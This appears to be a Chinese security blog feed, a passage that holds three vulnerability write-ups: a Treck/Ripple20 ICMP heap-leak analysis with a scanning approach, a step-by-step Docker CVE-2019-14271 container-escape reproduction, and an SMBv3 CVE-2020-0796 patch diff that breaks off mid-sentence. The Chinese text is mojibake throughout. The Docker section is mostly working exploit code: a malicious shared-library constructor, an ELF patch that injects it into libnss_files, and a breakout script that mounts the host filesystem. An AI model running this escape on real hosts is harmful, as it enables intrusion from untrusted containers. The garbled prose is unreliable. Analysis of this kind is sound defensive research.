src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630213503.png" alt="image-20200630213501855"></a></p><p>å‚è€ƒå¦‚ä¸Šå®ä¾‹ï¼š</p><p>å½“ç½‘ç»œå †æ ˆæ¥æ”¶åˆ°è¿™ä¸¤ä¸ªç‰‡æ®µæ—¶ï¼Œå®ƒä¼šä½¿ç”¨tfIpReAssemblePacketé‡æ–°ç»„è£…å®ƒä»¬ã€‚æ­¤å‡½æ•°ä½¿ç”¨tsUserPacketç»“æ„ä¸­çš„å­—æ®µpktuLinkNextPtré“¾æ¥ä¸¤ä¸ªç‰‡æ®µã€‚å¦‚æœå¯ç”¨äº†éš§é“ï¼Œåˆ™IPå±‚æ¥ä¸‹æ¥å°†åœ¨å‡½æ•°tfIpIncomingPacketä¸­å¤„ç†å†…éƒ¨IPæ•°æ®åŒ…ã€‚</p><p>å†…éƒ¨IPåˆ†ç»„é€šè¿‡IPæŠ¥å¤´å¥å…¨æ€§æ£€æŸ¥ï¼Œå› ä¸ºåªè€ƒè™‘tsUserPacketçš„pktuChainDataLengthå­—æ®µ(è€Œä¸æ˜¯pktuLinkDataLength)ã€‚æ­¤å¤–ï¼Œç”±äºåœ¨æ ‡å‡†IPæŠ¥å¤´(20å­—èŠ‚)ä¹‹åæœ‰4ä¸ªç©ºå­—èŠ‚ï¼Œå¹¶ä¸”ç©ºå­—èŠ‚è¡¨ç¤ºé€‰é¡¹åˆ—è¡¨çš„æœ«å°¾(è§<a href="https://tools.ietf.org/html/rfc791)%EF%BC%8C%E5%9B%A0%E6%AD%A4IP%E9%80%89%E9%A1%B9%E8%A7%A3%E6%9E%90%E9%80%9A%E8%BF%87%E3%80%82">https://tools.ietf.org/html/rfc791)ï¼Œå› æ­¤IPé€‰é¡¹è§£æé€šè¿‡ã€‚</a></p><p>å¦‚æœå†…éƒ¨IPæ•°æ®åŒ…çš„IPæŠ¥å¤´ä¸­çš„æ€»é•¿åº¦å­—æ®µä¸¥æ ¼å°äºé“¾æ•°æ®é•¿åº¦ï¼Œåˆ™ç½‘ç»œå †æ ˆå°†å°è¯•ä¿®å‰ªæ•°æ®åŒ…ã€‚å¦‚å‰æ–‡ä¸­æ‰€è¿°ï¼Œä¿®å‰ªæ˜¯é€šè¿‡å°†å­—æ®µpktuLinkDataLengthå’ŒpktuChainDataLengthè®¾ç½®ä¸ºç›¸åŒçš„å€¼ï¼Œå³æ€»é•¿åº¦å­—æ®µ(åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ä¸º100)æ¥å®ç°çš„ã€‚</p><p>ç”±äºå†…éƒ¨IPæ•°æ®åŒ…åŒ…å«æ— æ•ˆçš„IPv4åè®®å·(åè®®0)ï¼Œå› æ­¤ç½‘ç»œå †æ ˆå°†é€šè¿‡å‘é€ç±»å‹ä¸º3(ç›®çš„åœ°ä¸å¯è¾¾)ä»£ç ä¸º2(åè®®ä¸å¯è¾¾)çš„ICMPé”™è¯¯æ¶ˆæ¯æ¥æ‹’ç»è¯¥æ•°æ®åŒ…ã€‚</p><p>è´Ÿè´£åˆ›å»ºé”™è¯¯æ•°æ®åŒ…çš„å‡½æ•°æ˜¯tfIcmpErrPacketã€‚å®ƒä¼šåˆ†é…ä¸€ä¸ªæ–°æ•°æ®åŒ…ï¼Œåˆå§‹åŒ–ä¸€äº›ICMPå­—æ®µï¼Œå¹¶æœ€ç»ˆä»è¿è§„æ•°æ®åŒ…(å†…éƒ¨IPæ•°)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">length   =   (packetPtr-&gt;pktUserStruct).pktuLinkDataLength; <span class="keyword">if</span> (headerLengthInBytes + <span class="number">8</span> &lt;= length) &#123;</span><br><span class="line">length = headerLengthInBytes + <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(icmpErrHdrPtr + <span class="number">8</span>, pktIpHdrPtr, length);</span><br></pre></td></tr></table></figure><p>æ­£å¦‚æˆ‘ä»¬æ‰€çœ‹åˆ°çš„ï¼ŒtfIcmpErrPacketé€šè¿‡å–IPæŠ¥å¤´é•¿åº¦(ä»¥å­—èŠ‚ä¸ºå•ä½)åŠ 8(åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œ60+8=68)å’ŒpktuLinkDataLengthå­—æ®µ(åœ¨æœ¬ä¾‹ä¸­ä¿®å‰ªä¸º100)ä¹‹é—´çš„æœ€å°å€¼æ¥è®¡ç®—è¦å¤åˆ¶çš„å­—èŠ‚æ•°ã€‚ç”±äºè¿è§„æ•°æ®åŒ…çš„ç¬¬ä¸€ä¸ªç‰‡æ®µçš„å®é™…é“¾æ¥æ•°æ®é•¿åº¦ä¸º24(ä¸æ˜¯100)ï¼ŒtfIcmpErrPacketå°†å¤åˆ¶68âˆ’24=44å­—èŠ‚ä»å †ä¸­æ³„æ¼çš„æ•°æ®ã€‚</p><p>æ­¤æ¼æ´å¯ç”¨äºåœ¨å¯ç”¨æ¼æ´ç¼“è§£(å¦‚ASLR)æ—¶ï¼Œä»¥åŠåœ¨æ²¡æœ‰è°ƒè¯•å™¨çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨CVE2020-11896å’Œå…¶ä»–RCEæ¼æ´è¿›è¡Œæ”»å‡»ã€‚</p><p>2020-7-2 æ›´æ–°</p><p>è¯•äº†ä¸‹æ–‡ç« å†™çš„ poc å‘ç°å¹¶æ²¡æœ‰ä»»ä½•è¿”å›ï¼Œä½†æ˜¯æœºå™¨ç›´æ¥æ‰“å´©äº†ã€‚ç­‰ä¸ªå¯ä»¥è°ƒè¯•çš„è®¾å¤‡ã€‚</p><h2 id="å…³äº-treck-åè®®æ ˆæ‰«æ"><a href="#å…³äº-treck-åè®®æ ˆæ‰«æ" class="headerlink" title="å…³äº treck åè®®æ ˆæ‰«æ"></a>å…³äº treck åè®®æ ˆæ‰«æ</h2><p>çœ‹åˆ° å¯æ˜æ˜Ÿè¾° ADLAB çš„å…¬ä¼—å·æåˆ°äº† Treckåè®®æ ˆè‡ªå®šä¹‰äº†ç±»å‹ä¸º165(0xa5)çš„ICMPåŒ…ï¼Œå¹¶ä¸€æ—¦æ”¶åˆ°165çš„ICMPåŒ…ä¼šå›å¤ç±»å‹ä¸º166çš„ICMPåŒ…å“åº”ã€‚<a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630215750.webp" title="img" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630215750.webp" alt="img"></a></p><p>ç”±äºæ‰‹å¤´æ²¡æœ‰ç›¸åº”çš„è®¾å¤‡ï¼Œä»¥åŠæŸ¥ä¸‹å…¬å¸çš„æ‰“å°æœºç›¸å…³è®¾å¤‡ï¼Œä¼¼ä¹éƒ½æ²¡æœ‰åœ¨å®˜æ–¹å…¬å‘Šçš„å½±å“èŒƒå›´å†…ï¼Œæ‰€ä»¥ç”¨è¿™ä¸ªæ–¹æ³•è·‘äº†ä¸‹ï¼Œå°±åˆ°ç›®å‰å†™è¿™ç¯‡æ–‡ç« ä¸ºæ­¢äº†ï¼Œå¤§æ¦‚è·‘äº†1000å¤šä¸ª IP ï¼Œæ²¡æœ‰ä»»ä½•è¿”å›ï¼Œç›®å‰çŒœæµ‹ï¼Œå…¬ç½‘ scan çš„ è¯å¯èƒ½ä¼šè¢«ç½‘å…³ç»™ drop æ‰ã€‚</p><p>2020-7-2 æ›´æ–°ï¼š</p><p>æ˜¨å¤©å‘ç°ä¸Šæµ·å…¬å¸æœ‰ä¸€å°è®¾å¤‡ï¼Œæµ‹è¯•çš„æ—¶å€™å‘ç° scapy å†™çš„æ‰«ææ˜¯æœ‰é—®é¢˜çš„ï¼Œscapy æœ¬èº«ä¼¼ä¹å¯¹åŒ…è¿›è¡Œäº†åˆ¤æ–­ï¼Œå¯¼è‡´æ‹¿ä¸åˆ°å›åŒ…ï¼Œæ‰€ä»¥ github ä¸Šå…¬å¼€çš„æ‰«æåº”è¯¥æ˜¯ä¸è¡Œï¼Œå¦å¤–ä¸€ç‚¹ ttl å¦‚æœå¤ªå°ä¼¼ä¹ä¹Ÿä¼šè¢«dropæ‰(åœ¨å¤šå±‚è·¯ç”±çš„æƒ…å†µä¸‹)</p><p>è¿™é‡Œè´´ä¸€ä¸‹æˆ‘ç”¨ socket å†™çš„è„šæœ¬</p><p>è®¾ç½® ICMP_ECHO_REQUEST ä¸º0xa5 ï¼Œç„¶åå†æ”¶åŒ…åˆ¤æ–­ type</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702112743.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702112743.png"></a></p><p>ä¾‹ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702214200.png" title="image-20200702113751286" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200702214200.png" alt="image-20200702113751286"></a></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.jsof-tech.com/wp-content/uploads/2020/06/JSOF_Ripple20_Technical_Whitepaper_June20.pdf">https://www.jsof-tech.com/wp-content/uploads/2020/06/JSOF_Ripple20_Technical_Whitepaper_June20.pdf</a></p><p><a href="https://mp.weixin.qq.com/s/2F1-35HIk126crowAh9LLw">https://mp.weixin.qq.com/s/2F1-35HIk126crowAh9LLw</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-11896 </tag>
            
            <tag> CVE-2020-11898 </tag>
            
            <tag> Treck </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-14271 docker escape</title>
      <link href="CVE-2019-14271-docker-escape.html"/>
      <url>CVE-2019-14271-docker-escape.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<blockquote><p><a href="https://github.com/moby/moby/pull/39612">https://github.com/moby/moby/pull/39612</a></p></blockquote><h2 id="github-issueï¼š"><a href="#github-issueï¼š" class="headerlink" title="github issueï¼š"></a>github issueï¼š</h2><p>Initialize nss libraries in Glibc so that the dynamic libraries are loaded in the host environment not in the chroot from untrusted files.</p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14271">CVE-2019-14271</a>Â may allow unprivileged access to host system while copying files from a malicious container image withÂ <code>docker cp</code>Â command.</p><p><strong>Affected versions</strong>: v19.03.0. Older Docker versions are not affected by this issue.</p><p>This fix is included in the already releasedÂ <a href="https://github.com/docker/docker-ce/releases/v19.03.1">Docker v19.03.1</a>. Users of Docker v19.03.0 are advised to upgrade.</p><p>The patch was previously reviewed internally by maintainers under GitHub security advisory.If you find security issues in Moby, please follow responsible disclosure guidelines by sending an email toÂ <a href="mailto:security@docker.com">security@docker.com</a>.</p><p>yum list docker-ce â€“showduplicates|sort â€“r</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ä¸¤å¤©å’Œ @explorer ä¸€èµ·çœ‹äº†ä¸‹è¿™ä¸ªæ´ï¼Œä»¥åŠå¥½ä¹…æ²¡æ›´åšå®¢äº†ï¼Œéšæ‰‹å†™ä¸ªæ–‡ç« è®°å½•ä¸‹ï¼š</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ¼æ´æˆå› æ˜¯ç”±äºï¼Œ<code>docker cp</code>  è¿›è¡Œæ‹·è´çš„æ—¶å€™ï¼Œå°† <code>docker-tar</code> æ­¤è¿›ç¨‹å…ˆ chroot åˆ°å®¹å™¨å†…ï¼Œç„¶è€Œæ­¤æ—¶ä½¿ç”¨çš„ so æ–‡ä»¶ä¹Ÿæ˜¯å®¹å™¨å†…çš„ï¼Œè€Œ <code>docker-tar</code> è¿›ç¨‹æœ¬èº«æ²¡æœ‰å®¹å™¨åŒ–ï¼Œæ„å‘³ç€ä»ç„¶æ‹¥æœ‰é«˜æƒé™ï¼Œæ‰€ä»¥æ­¤æ—¶å¦‚æœå®¹å™¨å†…çš„ so è¢«æ¶æ„ç¯¡æ”¹ï¼Œé‚£ä¹ˆå¯èƒ½é€ æˆ docker å®¹å™¨é€ƒé€¸ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp cve-2019-14271:/lib ./lib &amp; <span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> ps -auxf |grep -v grep|grep docker-tar|tr -s <span class="string">&#x27; &#x27;</span>|cut -d <span class="string">&#x27; &#x27;</span> -f 2|xargs -I&#123;&#125; ls -al /proc/&#123;&#125;/root ; <span class="keyword">done</span> |  uniq</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šè¿°å‘½ä»¤å¯ä»¥æ¸…æ™°çš„çœ‹åˆ° chroot è¿‡ç¨‹</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183320.png" title="chroot" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183320.png" alt="chroot"></a></p><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>å®‰è£… apt ä¾èµ–åŒ…ï¼Œç”¨äºé€šè¿‡HTTPSæ¥è·å–ä»“åº“: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg-agent \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure><p>æ·»åŠ  Docker çš„å®˜æ–¹ GPG å¯†é’¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤è®¾ç½®ç¨³å®šç‰ˆä»“åº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line">   <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">  stable&quot;</span></span><br></pre></td></tr></table></figure><p>åˆ—å‡º <code>docker-ce</code> çš„æ‰€æœ‰ç‰ˆæœ¬ </p><p><code>apt-cache madison docker-ce</code></p><p>å®‰è£…æœ‰æ¼æ´çš„ç‰ˆæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce=5:19.03.0~3-0~ubuntu-bionic docker-ce-cli=5:19.03.0~3-0~ubuntu-bionic containerd.io</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>ç”±äºæ˜¯ <code>docker-cp</code> è¿™ä¸ªè¿›ç¨‹å‡ºç°çš„é—®é¢˜ï¼Œå…¶æœ¬èº«ç”¨åˆ°äº† <code>libnsss_*.so*</code> çš„ä¸€äº›åº“ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©å¯¹å…¶è¿›ç¨‹ so åŠ«æŒ</p><p>åŠ«æŒä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> __attribute__((constructor)) back() </span><br><span class="line">&#123;     </span><br><span class="line"> FILE *proc_file = fopen(<span class="string">&quot;/proc/self/exe&quot;</span>,<span class="string">&quot;r&quot;</span>);   </span><br><span class="line"> <span class="keyword">if</span> (proc_file !=<span class="literal">NULL</span>)    &#123;   </span><br><span class="line">                fclose(proc_file);       </span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;        </span><br><span class="line">system(<span class="string">&quot;/breakout&quot;</span>);        </span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºç¨‹åºåœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œæœ‰chroot è¿‡ç¨‹ï¼Œé¿å…å…¶ä»–è¿›ç¨‹ä¹Ÿä½¿ç”¨äº†è¿™äº›åº“ï¼Œæ‰€ä»¥å…ˆåˆ¤æ–­ <code>/proc/self/exe</code> æ˜¯å¦å¯è¯»ï¼Œå¦‚æœå¯è¯»åˆ™ä¸æ˜¯æˆ‘ä»¬çš„ç›®æ ‡è¿›ç¨‹</p><p>å¦å¤–è¿™é‡Œç”¨åˆ°äº† <code>constructor</code> é­”æœ¯æ–¹æ³•ï¼Œä¹‹å‰åœ¨ geekpwn maxhub åˆ©ç”¨çš„æ—¶å€™ä¹Ÿæåˆ°äº†ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚</p><p>patch <code>libss_files-2.27.so</code> ä»£ç , è¿™é‡Œä½¿ç”¨ lief è¿›è¡Œ patch</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> lief</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lief.parse(<span class="string">&quot;./libnss_files-2.27.so&quot;</span>)</span><br><span class="line">&lt;lief.ELF.Binary object at <span class="number">0x7f749704f030</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a= lief.parse(<span class="string">&quot;./libnss_files-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.add_library(<span class="string">&quot;/tmp/a.out&quot;</span>)</span><br><span class="line">&lt;lief.ELF.DynamicEntryLibrary object at <span class="number">0x7f74963d9ae8</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.write(<span class="string">&quot;libnss_files-2.27.so.patch&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åå°†ä¸Šé¢çš„ c ä»£ç è¿›è¡Œç¼–è¯‘</p><p><code>gcc -shared -fPIC backdoor.c</code></p><p>é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªå®¹å™¨ä½œä¸ºæ”»å‡»ç›®æ ‡</p><p><code>docker run --rm -it --name cve-2019-14271 ubuntu:18.04 /bin/bash</code></p><p>ç„¶åå°†ä¿®æ”¹åçš„ so å’Œåˆ©ç”¨çš„è„šæœ¬æ”¾å…¥å®¹å™¨å†…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp a.out cve-2019-14271:/tmpâ€¨</span><br><span class="line">docker cp breakout cve-2019-14271:/â€¨</span><br><span class="line">docker cp libnss_files.so.2_patch cve-2019-14271:/lib/x86_64-linux-gnu/libnss_files-2.27.so</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ breakoutçš„å†…å®¹ä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir /host_fs</span><br><span class="line">mount -t proc none /proc</span><br><span class="line"><span class="built_in">cd</span> /proc/1/root</span><br><span class="line">mount --<span class="built_in">bind</span> . /host_fs</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hack by chaitin&quot;</span> &gt; /proc/1/root/tmp/hack</span><br></pre></td></tr></table></figure><p>åˆ™æ„å‘³ç€ï¼Œæ”»å‡»æˆåŠŸæœ‰ä¸¤ä¸ªæ ‡å¿—ï¼š</p><p>1ã€å®¹å™¨å†…çš„ /host_fs æ˜ å°„äº†å®¹å™¨å¤–çš„å†…å®¹</p><p>2ã€å®¹å™¨å¤–çš„ tmp çš„ hack å†™å…¥ <code>hack by chaitin</code></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183342.png" title="mount-root-fs-to" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183342.png" alt="mount-root-fs-to"></a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183355.png" title="docker%20CVE%202019%2014271%20040822a50127454aac6713a0750ab5fb/Untitled%202.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183355.png" alt="docker%20CVE%202019%2014271%20040822a50127454aac6713a0750ab5fb/Untitled%202.png"></a></p><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p><a href="https://github.com/moby/moby/pull/39612/files/a316b10dab79d9298b02c7930958ed52e0ccf4e4#diff-7d8fc0dcb0916621d523276add8210c2](https://github.com/moby/moby/pull/39612/files/a316b10dab79d9298b02c7930958ed52e0ccf4e4#diff-7d8fc0dcb0916621d523276add8210c2)">patch diif</a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183400.png" title="patch-diff" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183400.png" alt="patch-diff"></a></p><p>è¡¥ä¸æ–°å¢äº† <code>init</code> å‡½æ•°ï¼Œå¼ºåˆ¶è¿›ç¨‹è¿›å…¥åˆ°å®¹å™¨å†…çš„æ—¶å€™ï¼Œå…ˆåŠ è½½å®¹å™¨å¤–çš„ so æ–‡ä»¶</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><blockquote><p><a href="https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/">https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/</a></p></blockquote></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> CVE-2019-14271 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0796 SMBv3 æ¼æ´åˆ†æ</title>
      <link href="CVE-2020-0796-analysis.html"/>
      <url>CVE-2020-0796-analysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="CVE-2020-0796-SMBv3-æ¼æ´åˆ†æ"><a href="#CVE-2020-0796-SMBv3-æ¼æ´åˆ†æ" class="headerlink" title="CVE-2020-0796 SMBv3 æ¼æ´åˆ†æ"></a>CVE-2020-0796 SMBv3 æ¼æ´åˆ†æ</h1><p>3æœˆ13æ—¥ å‡Œæ™¨å·¦å³ ï¼Œå¾®è½¯æ”¾äº†è¿™ä¸ªæ¼æ´çš„è¡¥ä¸â€¦æ‰€ä»¥ç¨å¾®åˆ†æä¸€ä¸‹ä»–çš„è¡¥ä¸</p><h2 id="Bindiff"><a href="#Bindiff" class="headerlink" title="Bindiff"></a>Bindiff</h2><p>é€šè¿‡ bindiff æ¯”è¾ƒå‘ç°ä¸€ä¸ªå‡½æ•°ï¼Œä¸”åå­—ä¹Ÿè›®å¯ç–‘çš„..</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032004.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032004.png" style="zoom: 50%;" /></a><p>è¿™ä¸ªå‡½æ•°åå« <code>Srv2DecompressData</code> å®é™…ä¸Šå’Œæ¼æ´æè¿°å…¶å®ä¹Ÿå·®ä¸å¤š..</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032123.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032123.png" style="zoom: 50%;" /></a><p>ä¼¼ä¹æ˜¯åŠ äº†æ£€æŸ¥..æˆ‘ä»¬ æ‰“å¼€IDAæ¥æ¯”å¯¹ä¸€ä¸‹ ä¸¤è€…çš„å·®åˆ«..</p><h2 id="è¡¥ä¸"><a href="#è¡¥ä¸" class="headerlink" title="è¡¥ä¸"></a>è¡¥ä¸</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032244.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032244.png"></a></p><p>å·¦è¾¹æ˜¯æœ‰æ¼æ´çš„ç‰ˆæœ¬ï¼Œå³è¾¹æ˜¯ Patch åçš„ç‰ˆæœ¬ .. æ¯”å¯¹äº†ä¸€ä¸‹å‘ç°ä¼¼ä¹å¢åŠ äº†ä¸€ä¸ªæ£€æŸ¥..å°¤å…¶æ˜¯å¢åŠ çš„ä¸€ä¸ªå«</p><p><code>RtlULongAdd</code> çš„å‡½æ•°..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RtlULongAdd(ULONG ulAugend, ULONG ulAddend, ULONG *pulResult)</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°çš„å‚æ•°æ˜¯ ä¸¤ä¸ªä¼¼ä¹ recve çš„æ•°æ® ä»¥åŠä¸€ä¸ªå˜é‡..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS __stdcall <span class="title">RtlULongAdd</span><span class="params">(ULONG ulAugend, ULONG ulAddend, ULONG *pulResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ULONG v3; <span class="comment">// eax</span></span><br><span class="line">  ULONG v4; <span class="comment">// edx</span></span><br><span class="line">  NTSTATUS result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = ulAugend + ulAddend;</span><br><span class="line">  v4 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt;= ulAugend )</span><br><span class="line">    v4 = v3;</span><br><span class="line">  result = v3 &lt; ulAugend ? <span class="number">0xC0000095</span> : <span class="number">0</span>;</span><br><span class="line">  *pulResult = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹äº†ä¸€ä¸‹è¿™ä¸ª  åˆ¤æ–­äº†  ulAugend + ulAddend ç›¸åŠ åçš„å’Œæ˜¯å¦å°äºå…¶ä¸­ä¸€ä¸ª åŠ æ•°..å¦‚æœæ˜¯åˆ™å°†å…¶ä¸­ä¸€ä¸ªèµ‹å€¼ç»™è¿”å›å€¼..ä»è¿™é‡Œå¤§æ¦‚èƒ½åˆæ­¥åˆ¤æ–­æ˜¯ä¸ªä»€ä¹ˆæ¼æ´äº†..åŸºæœ¬èƒ½çŒœæµ‹æ˜¯ä¸ª  